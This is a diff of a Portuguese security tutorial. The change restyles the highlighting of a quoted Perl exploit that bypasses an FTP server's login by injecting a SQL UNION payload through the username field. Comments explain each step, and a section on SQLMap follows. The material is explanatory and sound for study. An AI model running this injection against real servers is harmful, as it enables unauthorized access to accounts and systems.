@@ -125,22 +125,21 @@ http://downloads.securityfocus.com/vulnerabilities/exploits/33722.pl
 
 É possível perceber a simplicidade da exploração da falha:
 
-<pre style="background:#000;color:#f8f8f8"><span style="color:#3e87e3">$host</span> = <span style="color:#3e87e3">$ARGV</span>[0]; <span style="color:#aeaeae;font-style:italic"># Variável $host recebe o endereço IP do servidor á ser atacado</span>
+<pre style="background:rgba(238,238,238,0.92);color:#000">$host = $ARGV[0]; <span style="color:#06f;font-style:italic"># Variável $host recebe o endereço IP do servidor á ser atacado</span>
 
-<span style="color:#aeaeae;font-style:italic"># Variável $user é inicializada com pedaço de código SQL que deverá 'confundir'</span>
-<span style="color:#aeaeae;font-style:italic"># processo de autenticação no lado do servidor:</span>
-<span style="color:#3e87e3">$user</span> = <span style="color:#65b042">"USER %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; --"</span>; 
-<span style="color:#3e87e3">$pass</span> = <span style="color:#65b042">'1'</span>;
+<span style="color:#06f;font-style:italic"># Variável $user é inicializada com pedaço de código SQL que deverá 'confundir'</span>
+<span style="color:#06f;font-style:italic"># processo de autenticação no lado do servidor:</span>
+$user = <span style="color:#093">"USER %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; --"</span>; 
+$pass = <span style="color:#093">'1'</span>;
 
-<span style="color:#aeaeae;font-style:italic"># Variável $ftp armazena descritor de conexão estabelecida com servidor FTP</span>
-<span style="color:#3e87e3">$ftp</span> = Net::FTP<span style="color:#e28964">-></span>new(<span style="color:#65b042">"<span style="color:#8a9a95">$host</span>"</span>, <span style="color:#3387cc">Debug </span>=> 0) <span style="color:#e28964">or</span> <span style="color:#e28964">die</span> <span style="color:#65b042">"[!] Cannot connect to <span style="color:#8a9a95">$host</span>"</span>;
+<span style="color:#06f;font-style:italic"># Variável $ftp armazena descritor de conexão estabelecida com servidor FTP</span>
+$ftp = Net::FTP<span style="color:#00f">-></span>new(<span style="color:#093">"$host"</span>, <span style="color:#6782d3">Debug </span>=> 0) <span style="color:#00f">or</span> <span style="color:#00f">die</span> <span style="color:#093">"[!] Cannot connect to $host"</span>;
 
-<span style="color:#aeaeae;font-style:italic"># O login malicioso é realizado, perceba que nome de usuário é simplesmente</span>
-<span style="color:#aeaeae;font-style:italic"># o conteúdo de $user</span>
-<span style="color:#3e87e3">$ftp</span><span style="color:#e28964">-></span>login(<span style="color:#65b042">"<span style="color:#8a9a95">$user</span>"</span>,<span style="color:#65b042">"<span style="color:#8a9a95">$pass</span>"</span>) <span style="color:#e28964">or</span> <span style="color:#e28964">die</span> <span style="color:#65b042">"<span style="color:#ddf2a4">\n</span><span style="color:#ddf2a4">\n</span>[!] Couldn't ByPass The authentication ! "</span>, <span style="color:#3e87e3">$ftp</span><span style="color:#e28964">-></span>message;
-<span style="color:#dad085">print</span> <span style="color:#65b042">"<span style="color:#ddf2a4">\n</span>[*] Connected To <span style="color:#8a9a95">$host</span>"</span>;
+<span style="color:#06f;font-style:italic"># O login malicioso é realizado, perceba que nome de usuário é simplesmente</span>
+<span style="color:#06f;font-style:italic"># o conteúdo de $user</span>
+$ftp<span style="color:#00f">-></span>login(<span style="color:#093">"$user"</span>,<span style="color:#093">"$pass"</span>) <span style="color:#00f">or</span> <span style="color:#00f">die</span> <span style="color:#093">"<span style="color:#6782d3">\n</span><span style="color:#6782d3">\n</span>[!] Couldn't ByPass The authentication ! "</span>, $ftp<span style="color:#00f">-></span>message;
+<span style="color:#33f;font-weight:700">print</span> <span style="color:#093">"<span style="color:#6782d3">\n</span>[*] Connected To $host"</span>;
 </pre>
-
 
 
 #### Usando o SQLMap
